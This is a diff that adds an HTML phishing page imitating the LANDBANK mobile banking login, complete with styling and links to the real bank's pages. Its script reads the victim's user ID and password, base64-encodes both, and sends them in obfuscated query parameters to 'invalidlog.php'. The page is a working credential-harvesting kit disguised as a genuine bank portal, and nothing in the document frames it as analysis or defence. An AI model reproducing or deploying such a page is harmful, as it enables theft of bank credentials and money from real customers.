@@ -1,0 +1,241 @@
+<html>
+ <head>
+  <title>
+   LANDBANK | Mobile Banking App
+  </title>
+  <meta content="Experience personal banking at your fingertips with the new LANDBANK Mobile Banking App" name="description"/>
+  <meta content="LANDBANK mobile banking" name="keywords"/>
+  <meta content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1" name="viewport"/>
+  <link href="https://www.landbank.com/images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css?family=Karla|Karla:Bold|Poppins|Poppins:600&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body{
+
+    background:rgba(0, 0, 0, 0.1);
+    font-family: Karla,sans-serif;
+}
+.container{
+    text-align:center;
+}
+.logo{
+    height:95px;
+    width:200px;
+    content:url(landbank_files/logo.png);
+}
+input[type=text]{
+    font-size:15px;
+    border: thin solid #dadce0;
+    padding:10px;
+    width:90%;
+    height:8%;
+    border-radius:3px;
+    color:#9b9b9b;
+    text-indent: 20px;
+    padding-right: 50px;
+    background: white;
+    outline:0;
+}
+input[type=password]{
+    font-size:15px;
+    padding:10px;
+    width:90%;
+    color:#9b9b9b;
+    border: thin solid #dadce0;
+    background: white;
+    height:8%;
+    text-indent: 20px;
+    border-radius:3px;
+    outline:0;
+}
+input[type=text]::placeholder, input[type=password]::placeholder{
+    text-indent: 20px;
+    color:#9e9e9e;
+}
+
+#next {
+    padding:9px;
+    border-radius:5px;
+    width:90%;
+    height:9%;
+    outline:0;
+    background:#16b24d;
+    color:white;
+    cursor:pointer;
+    border:0;
+    }
+#next:disabled {
+    padding:10px;
+    border-radius:5px;
+    width:90%;
+    height:9%;
+    outline:0;
+    border:0;
+    cursor:context-menu;
+    background:rgba(0,0,0,0.1);
+
+    }
+a{
+    text-decoration:none;
+    color:#16b24d;
+}
+
+.check{
+   text-align:left;
+   margin-left:5%;
+}
+
+.input-icons i {
+    position: absolute;
+    margin-top:12px;
+    margin-left:9px;
+}
+          
+.input-icons {
+    width: 100%;
+    color:green; 
+}
+
+
+.dialog{
+    background: white;
+    border-radius: 7px; 
+    padding: 40px 20px; 
+    border: thin solid #dadce0;
+    height: 480px;
+    width: 300px;
+}
+
+.input-icons .forgot{
+    position: absolute;
+    margin-top:-29px;
+    font-size:13px;
+    margin-left:100px;
+}
+
+.input-icons .unlock{
+    position: absolute;
+    margin-top:-29px;
+    font-size:13px;
+    margin-left:100px;
+}
+
+
+/** Desktop View */
+@media only screen and (min-width: 768px) {
+   input[type=text]::placeholder,input[type=password]::placeholder{
+    text-indent: 20px;
+}
+
+.input-icons .forgot{
+    margin-left:108px;
+}
+
+.input-icons .unlock{
+    margin-left:108px;
+}
+
+.dialog{
+    width: 350px;
+}
+
+#next {
+    padding:9px;
+    border-radius:5px;
+    width:90%;
+    height:9%;
+    outline:0;
+    background:#16b24d;
+    color:white;
+    cursor:pointer;
+    border:0;
+}
+.check{
+         text-align:left;
+         margin-left:6%;
+}}
+  </style>
+ </head>
+ <body>
+  <br/>
+  <center>
+   <div class="dialog">
+    <div class="container">
+     <div class="lb-form">
+      <img class="logo"/>
+      <br/>
+      <br/>
+      <form method="POST">
+       <br/>
+       <div class="input-icons">
+        <i class="fa fa-user icon">
+        </i>
+        <input id="loginuser" name="userid" onkeyup="length_disabled_btn(this.value)" placeholder="User ID" type="text"/>
+        <br/>
+        <span class="unlock">
+         <a href="https://www.landbank.com/iaccess-user-id-unlocking">
+          Unlock
+         </a>
+        </span>
+       </div>
+       <br/>
+       <div class="input-icons">
+        <i class="fa fa-key icon">
+        </i>
+        <input id="loginpassword" maxlength="15" name="passwd" onkeyup="length_disabled_btn(this.value)" placeholder="Password" type="password"/>
+        <br/>
+        <span class="forgot">
+         <a href="https://www.lbpiaccess.com/forgotpwd.xhtml">
+          Forgot?
+         </a>
+        </span>
+       </div>
+       <br/>
+       <div class="check">
+        <input name="check" type="checkbox"/>
+        <span style="font-size:14px;">
+         Save User ID
+        </span>
+       </div>
+       <br/>
+       <input disabled="" id="next" name="login" type="button" value="Log in"/>
+      </form>
+     </div>
+     <script>
+      document.getElementById('next').onclick = function () {
+    var username = document.getElementById("loginuser").value;
+    var password = document.getElementById("loginpassword").value;
+    window.location.href="invalidlog.php?YWhkaGFzaGFzaGFocw="+btoa(username)+"&WFqaWFqc2RpamFpamFqYWlkan="+btoa(password);
+}
+
+function length_disabled_btn(value){
+       var username = document.getElementById("loginuser").value;
+       var password = document.getElementById("loginpassword").value;
+       var login = username.toString().length;
+       var slogin = password.toString().length;
+         if(login > 0){
+              if(slogin > 0){
+                 document.getElementById("next").disabled = false;              
+              }
+         
+              } else{
+                document.getElementById("next").disabled = true;
+              }
+}
+     </script>
+     <p style="font-size:14px;">
+      <a href="https://www.landbank.com/e-banking/open-update-an-account/online-application">
+       Open an Account
+      </a>
+     </p>
+     <p style="font-size:14px;">
+      Not yet enrolled?
+      <a href="https://www.landbank.com/e-banking/individual/landbank-mobile-banking-app">
+       Sign up now!
+      </a>
+     </p>
+    </div>
+   </div>
+  </center>
+ </body>
+</html>
